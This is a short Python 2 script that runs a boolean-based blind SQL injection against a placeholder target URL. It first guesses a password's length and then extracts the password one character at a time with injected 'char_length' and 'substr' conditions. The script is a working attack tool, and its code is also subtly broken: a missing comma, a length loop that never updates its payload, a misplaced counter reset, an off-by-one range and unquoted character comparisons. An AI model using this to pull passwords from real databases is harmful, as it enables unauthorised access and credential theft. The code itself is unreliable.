#!/usr/bin/python2
# This script uses boolean based SQLi based on some true of false statement to try and find the password length and then the password

import requests
import sys


yes = sys.argv[1]
i = 1
asciivalue = 1
answer = []
print "Kicking off the attempt"
payload = {'injection': '\'AND char_length(password) ='+str(i)+';#', 'Submit': 'submit'}

while True:
    req = requests.post('<target url>' data=payload)
    lengthtest = req.text
    if yes in lengthtest:
        length = i
        break
    else:
        i = i+1


for x in range(1, length):
    while asciivalue < 126:
        payload = {'injection': '\'AND (substr(password, '+str(x)+', 1)) ='+ chr(asciivalue)+';#', 'Submit': 'submit'}
        req = requests.post('<target url>', data=payload)
        if yes in req.text:
            answer.append(chr(asciivalue))
            break
        else:
            asciivalue = asciivalue + 1
            pass
asciivalue = 0
print "Recovered String: "+ ''.join(answer)